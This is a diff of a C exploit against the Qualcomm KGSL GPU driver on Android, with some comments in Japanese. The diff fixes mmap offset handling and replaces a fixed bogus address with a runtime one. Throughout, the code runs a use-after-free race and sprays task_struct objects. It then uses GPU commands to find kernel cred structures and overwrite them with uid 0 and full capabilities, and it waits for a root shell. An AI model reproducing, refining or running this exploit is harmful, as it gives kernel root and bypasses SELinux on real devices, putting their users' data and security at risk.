@@ -1,3 +1,4 @@
+#define _GNU_SOURCE
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -69,25 +70,19 @@ struct kgsl_cmdstream_readtimestamp_ctxtid { unsigned int context_id, type, time
 #define KGSL_CMDLIST_IB 0x00000001U
 #define KGSL_TIMESTAMP_RETIRED 0x00000002
 
-/* ===== 修正アドレス（AVCバイパス実績範囲） ===== */
+/* アドレス範囲は AVC バイパス実績のある範囲に固定 */
 #define UAF_ADDR       0x10000000ULL
-#define UAF_SIZE       0x1000000ULL          // 16MB
+#define UAF_SIZE       0x1000000ULL          /* 16MB */
 #define OVERLAP_ADDR   0x10FFE000ULL
 #define OVERLAP_SIZE   0x7000ULL
-#define BOGUS_ADDR     0x11000000ULL
 #define BOGUS_SIZE     0xffffffffffefd000ULL
 #define PLACEHOLDER_ADDR 0x12000000ULL
-#define PLACEHOLDER_SIZE 0x10400000ULL       // 16MB+256KB
+#define PLACEHOLDER_SIZE 0x10400000ULL       /* 16MB+256KB */
 
-// vmlinux symbols (pre-KASLR)
 #define VMLINUX_TEXT      0xffffffc010080000ULL
 #define VMLINUX_INIT_CRED 0xffffffc012197d08ULL
 #define VMLINUX_SELINUX_STATE 0xffffffc0123a4000ULL
 #define VMLINUX_SELINUX_ENFORCING_BOOT 0xffffffc01240744cULL
-
-// task_struct cred offset (pahole: cred at 1856=0x740)
-#define CRED_OFF    0x740
-#define REAL_CRED_OFF 0x738
 
 #define SPRAY_PIDS 2000
 #define SCAN_DWORDS 560
@@ -95,6 +90,7 @@ struct kgsl_cmdstream_readtimestamp_ctxtid { unsigned int context_id, type, time
 static int kgsl_fd = -1;
 static volatile int race_done = 0;
 static volatile int dc_civac_works = -1;
+static uint64_t bogus_addr = 0;
 
 static void sigill_handler(int sig) { dc_civac_works = 0; }
 
@@ -188,23 +184,27 @@ static int gpuobj_alloc(int fd, uint64_t size, uint64_t flags) {
     return a.id;
 }
 
-static void *gpuobj_mmap_fixed(int fd, size_t size, unsigned int id, void *addr) {
-    /* オフセットを 64bit で計算してから off_t にキャスト（オーバーフロー防止） */
-    off_t offset = (off_t)((uint64_t)id << 12);
-    void *p = mmap(addr, size, PROT_READ|PROT_WRITE,
-                   MAP_SHARED|MAP_FIXED, fd, offset);
-    if (p == MAP_FAILED) {
-        fprintf(stderr, "[!] mmap failed: addr=%p size=0x%lx offset=0x%lx id=%u errno=%d (%s)\n",
-                addr, (unsigned long)size, (unsigned long)offset, id, errno, strerror(errno));
-        exit(1);
-    }
+/* mmap64 を使用して 64-bit オフセットを確実に扱う */
+static void *gpuobj_mmap(int fd, size_t size, unsigned int id) {
+    off64_t offset64 = (off64_t)((uint64_t)id << 12);
+#ifdef __ANDROID__
+    void *p = mmap64(NULL, size, PROT_READ|PROT_WRITE, MAP_SHARED, fd, offset64);
+#else
+    void *p = mmap(NULL, size, PROT_READ|PROT_WRITE, MAP_SHARED, fd, (off_t)offset64);
+#endif
+    if (p == MAP_FAILED) die("gpuobj_mmap");
     return p;
 }
 
-static void *gpuobj_mmap(int fd, size_t size, unsigned int id) {
-    off_t offset = (off_t)((uint64_t)id << 12);
-    void *p = mmap(NULL, size, PROT_READ|PROT_WRITE, MAP_SHARED, fd, offset);
-    if (p == MAP_FAILED) die("gpuobj_mmap");
+static void *gpuobj_mmap_fixed(int fd, size_t size, unsigned int id, void *addr) {
+    off64_t offset64 = (off64_t)((uint64_t)id << 12);
+    void *p = mmap(addr, size, PROT_READ|PROT_WRITE,
+                   MAP_SHARED|MAP_FIXED, fd, offset64);
+    if (p == MAP_FAILED) {
+        fprintf(stderr, "[!] mmap fixed failed: addr=%p size=0x%lx offset=0x%llx id=%u errno=%d (%s)\n",
+                addr, (unsigned long)size, (unsigned long long)offset64, id, errno, strerror(errno));
+        exit(1);
+    }
     return p;
 }
 
@@ -274,7 +274,7 @@ static int submit_ib(int fd, unsigned int ctx_id, uint64_t ib_gpuaddr,
 }
 
 static void *race_thread(void *arg) {
-    struct kgsl_gpuobj_import_useraddr uaddr = { .virtaddr = BOGUS_ADDR };
+    struct kgsl_gpuobj_import_useraddr uaddr = { .virtaddr = bogus_addr };
     struct kgsl_gpuobj_import imp = {
         .priv = (uint64_t)&uaddr, .priv_len = BOGUS_SIZE,
         .flags = KGSL_MEMFLAGS_USE_CPU_MAP, .type = KGSL_USER_MEM_TYPE_ADDR,
@@ -290,7 +290,12 @@ int main(int argc, char **argv) {
     if (kgsl_fd < 0) die("open kgsl");
     printf("[+] kgsl fd=%d\n", kgsl_fd);
 
-    // Phase 0: KASLR detection (optional, failure is OK)
+    void *bogus_page = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE,
+                            MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
+    if (bogus_page == MAP_FAILED) die("mmap bogus");
+    bogus_addr = (uint64_t)bogus_page;
+    printf("[+] bogus_addr=0x%lx\n", (unsigned long)bogus_addr);
+
     printf("[*] Phase 0: Early KASLR detection\n");
     uint64_t init_cred_addr = detect_kaslr();
     printf("  init_cred=0x%lX\n", init_cred_addr);
@@ -305,16 +310,16 @@ int main(int argc, char **argv) {
     printf("[+] UAF mapped at %p\n", uaf_m);
     munmap(uaf_m, UAF_SIZE);
 
-    if (mmap((void*)BOGUS_ADDR, 0x1000, PROT_READ|PROT_WRITE,
+    if (mmap((void*)bogus_addr, 0x1000, PROT_READ|PROT_WRITE,
         MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0) == MAP_FAILED)
-        die("mmap BOGUS");
+        die("mmap BOGUS (fixed)");
 
     int ph_id = gpuobj_alloc(kgsl_fd, PLACEHOLDER_SIZE, alloc_flags);
     void *ph_m = gpuobj_mmap_fixed(kgsl_fd, PLACEHOLDER_SIZE, ph_id, (void*)PLACEHOLDER_ADDR);
     printf("[+] PLACEHOLDER mapped at %p\n", ph_m);
 
     printf("  UAF=0x%lx BOGUS=0x%lx PLACEHOLDER=0x%lx\n",
-        (unsigned long)UAF_ADDR, (unsigned long)BOGUS_ADDR,
+        (unsigned long)UAF_ADDR, (unsigned long)bogus_addr,
         (unsigned long)PLACEHOLDER_ADDR);
 
     // ===== Phase 2: Race =====
@@ -357,7 +362,7 @@ int main(int argc, char **argv) {
     if (rf >= 0) { write(rf, "3", 1); close(rf); }
     usleep(10000);
 
-    // ===== Phase 5: First spawn + pipe setup =====
+    // ===== Phase 5: Spawn task_struct spray =====
     printf("[*] Phase 5: Spawning task_struct spray...\n");
     int notify_pipe[2];
     if (pipe(notify_pipe) < 0) die("pipe");
@@ -530,7 +535,6 @@ int main(int argc, char **argv) {
             cred_offs[n_cred] = cred_off_found;
             n_cred++;
         }
-        // Scan for task_security_struct: groups of 6 identical dwords
         int sec_hits[64]; int n_sec = 0;
         for (int i = 0; i < SCAN_DWORDS - 6 && n_sec < 64; i++) {
             if (data[i] == data[i+1] && data[i] == data[i+2] &&
@@ -551,12 +555,10 @@ int main(int argc, char **argv) {
     }
     printf("[*] Scan complete: found %d task_struct pages, %d cred pages\n", n_task, n_cred);
 
-    // Storage for preserved cred fields (user, user_ns, group_info)
     uint32_t saved_user_lo = 0, saved_user_hi = 0;
     uint32_t saved_user_ns_lo = 0, saved_user_ns_hi = 0;
     uint32_t saved_grp_lo = 0, saved_grp_hi = 0;
 
-    // Dump first cred page content via GPU
     if (n_cred > 0) {
         printf("[*] Phase 7c: Dumping first cred page for layout verification\n");
         memset(ib_m, 0, 0x10000);
@@ -591,7 +593,6 @@ int main(int argc, char **argv) {
         }
     }
 
-    // ===== Phase 7e: Test GPU read from kernel VA (init_cred) =====
     uint64_t inc_sec = 0;
     {
         printf("[*] Phase 7e: Testing GPU read from kernel VA (init_cred)\n");
@@ -628,7 +629,6 @@ int main(int argc, char **argv) {
         }
     }
 
-    // ===== Phase 7b: GPU→CPU coherency =====
     printf("[*] Phase 7b: GPU→CPU coherency via DST buffer\n");
     {
         uint32_t *cmd = (uint32_t*)ib_m;
@@ -660,7 +660,6 @@ int main(int argc, char **argv) {
         }
     }
 
-    // ===== Phase 8b: Direct cred overwrite =====
     if (n_cred > 0) {
         printf("[*] Phase 8b: Writing uid=0 + full caps to %d cred pages\n", n_cred);
         int n_ok = 0;
@@ -670,7 +669,6 @@ int main(int argc, char **argv) {
             uint32_t zl, zh, dl, dh, sl, sh;
             int dw;
 
-            // Read before
             memset(ib_m, 0, 0x10000); memset(dst_m, 0, 0x1000);
             dw = 0;
             cmd[dw++] = cp_type7(CP_NOP, 0);
@@ -703,7 +701,6 @@ int main(int argc, char **argv) {
                 cmd[dw++] = zl; cmd[dw++] = zh;
             }
 
-            // Write uid=0 + full caps
             memset(ib_m, 0, 0x10000);
             dw = 0;
             split64(cbase + 0x04, &zl, &zh);
@@ -716,7 +713,6 @@ int main(int argc, char **argv) {
             cmd[dw++] = 0xFFFFFFFF; cmd[dw++] = 0x0000003F;
             cmd[dw++] = 0xFFFFFFFF; cmd[dw++] = 0x0000003F;
             cmd[dw++] = 0; cmd[dw++] = 0;
-            // Readback uid
             memset(dst_m, 0, 0x1000);
             split64(dst_ga, &dl, &dh);
             split64(cbase + 0x04, &sl, &sh);
@@ -734,7 +730,6 @@ int main(int argc, char **argv) {
         }
         printf("  Phase 8b: %d creds updated\n", n_ok);
 
-        // Read cred page AFTER
         if (n_cred > 0) {
             printf("[*] Phase 8c: Dumping cred page AFTER write\n");
             memset(ib_m, 0, 0x10000); memset(dst_m, 0, 0x1000);
@@ -767,7 +762,6 @@ int main(int argc, char **argv) {
         }
     }
 
-    // ===== Phase 8d: Cache eviction =====
     printf("[*] Phase 8d: Cache eviction\n"); fflush(stdout);
     void *ev = mmap(0, 0x2000000, PROT_READ|PROT_WRITE,
         MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
@@ -778,7 +772,6 @@ int main(int argc, char **argv) {
     }
     sleep(1);
 
-    // ===== Phase 9: Wait for root shell =====
     printf("[*] Phase 9: Waiting for root shell...\n");
     printf("  parent uid=%u euid=%u\n", getuid(), geteuid());
     fflush(stdout);
